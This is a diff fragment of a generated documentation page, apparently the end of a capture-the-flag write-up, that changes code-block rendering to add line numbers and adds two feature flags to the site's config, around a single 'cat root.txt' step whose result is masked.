-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>cat root.txt
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1"></a>cat root.txt
+</span></code></pre></div></td></tr></table></div>
 Results: <strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong>****</p>
 
 <!-- This section adds support for localized revision dates -->
@@ -17480,7 +17618,7 @@ Results: <strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
